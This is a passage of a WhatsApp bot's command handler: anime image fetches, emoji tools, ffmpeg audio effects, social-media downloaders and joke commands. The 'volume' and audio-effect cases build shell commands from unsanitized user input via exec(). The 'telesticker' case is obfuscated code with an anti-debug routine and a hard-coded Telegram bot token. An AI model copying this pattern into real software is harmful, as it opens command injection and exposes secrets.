 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await Lucy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcGhost("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcGhost("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
GhostStickWait()
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcGhost('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await Lucy.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await Lucy.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcGhost(`Example: ${prefix + command} 10`)
media = await Lucy.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcGhost('Error!')
jadie = fs.readFileSync(rname)
Lucy.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcGhost('Error!')
jadie = fs.readFileSync(rname)
Lucy.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcGhost("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcGhost('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcGhost(body)
  } catch (e) {
  replygcGhost(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcGhost(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGGhost/GhostMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcGhost(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Lucy.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcGhost(mess.error))
break
case "spotify":{
if (!isPrem) return replyprem(mess.premium)
if (!text) return replygcGhost(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcGhost(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await Lucy.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await Lucy.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                GhostStickWait()
                let media = await Lucy.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcGhost(err)
                let buff = fs.readFileSync(ran)
                Lucy.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcGhost(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcGhost(e)
                }
                break
                case 'define': 
if (!q) return replygcGhost(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcGhost(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   Lucy.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcGhost(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcGhost(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcGhost(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcGhost(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcGhost(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcGhost(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcGhost(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcGhost(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcGhost(jawab)
            }
            break
case 'where': {
if (!text) return replygcGhost(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcGhost(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcGhost(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcGhost(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcGhost(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcGhost(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcGhost(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const Ghostkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
Lucy.sendMessage(m.chat, { text: Ghostkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) return GhostStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Lucy.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./GhostMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return GhostStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
Lucy.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./GhostMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                Lucy.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcGhost('Digite o título da consulta')
                GhostStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                Lucy.sendMessage(m.chat, {caption: `Aqui esta ${pushname}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'maioria': {
            	if (!m.isGroup) return GhostStickGroup()
            	if (!text) return replygcGhost(`O que você deseja escolher?\nExemplo: ${prefix + command} indiota`)
             const groupMetadata = m.isGroup ? await Lucy.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let Ghostshimts = member[Math.floor(Math.random() * member.length)]
             Lucy.sendMessage(from, { 
text: `A maioria *${text}* aqui está *@${Ghostshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[Ghostshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./GhostMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
     case "igvid": case "instavideo": {
if (!text) return replygcGhost(`Onde está o link?\n\nExemplo : ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
GhostStickWait()
let resGhostyinsta = await GhostInstaMp4(text)
const gha1 = await Lucy.sendMessage(m.chat,{video:{url: resGhostyinsta.url[0].url},caption: mess.success},{quoted:m})
}
break
case 'instastalk': {
if (!args[0]) return replygcGhost(`Digite o nome de usuário do Instagram\n\nExemplo: ${prefix + command} unucorn_Ghost13`)
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *PERSEGUIÇÃO* 
▢ *🔖Nome:* ${res.name} 
▢ *🔖Nome de usuário:* ${res.username}
▢ *👥Seguidor:* ${res.followersH}
▢ *🫂Seguindo:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await Lucy.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        replygcGhost(`Certifique-se de que o nome de usuário vem do *Instagram*`)
      }
}
break

case "igimg": 
case "instaimg":  {
if (!text) return replygcGhost(`Onde está o link?\n\nExemplo : ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
GhostStickWait()
const risponsGhost = await GhostIgImg(text)
for (let i=0;i<risponsGhost.length;i++) {
let ghd = await Lucy.sendFileUrl(m.chat, risponsGhost[i], `Aqui Esta ${pushname}`, m)
}
}
break 
case "fbvideo":
case "facebookvid": {
  if (!text) return replygcGhost(`Onde está o URL?\n\nExemplo: ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
  GhostStickWait()
  let res = await GhostFb(q)
  let ghdp = await Lucy.sendMessage(from, { video: { url: res.url[0].url }, caption: mess.success }, { quoted: m })
  }
  break
  
case "twittervideo":
case "twitvid": {
  if (!text) return replygcGhost(`Onde está o URL?\n\nExemplo: ${prefix + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
  GhostStickWait()
  let res = await GhostTwitter(q)
  let ghdx = await Lucy.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
  }
  break
  
    case 'say': case 'tts': case 'gtts': {
if (!text) return replygcGhost('onde está o texto?')
            let texttts = text
            const Ghostrl = googleTTS.getAudioUrl(texttts, {
                lang: "pt",
                slow: false,
                host: "https://translate.google.com",
            })
            return Lucy.sendMessage(m.chat, {
                audio: {
                    url: Ghostrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        case 'telesticker': { 
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','\x20Completo','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20segundos','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Tempo Estimado para ser','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total De\x20sti'+'cker\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20em:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await Lucy[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return 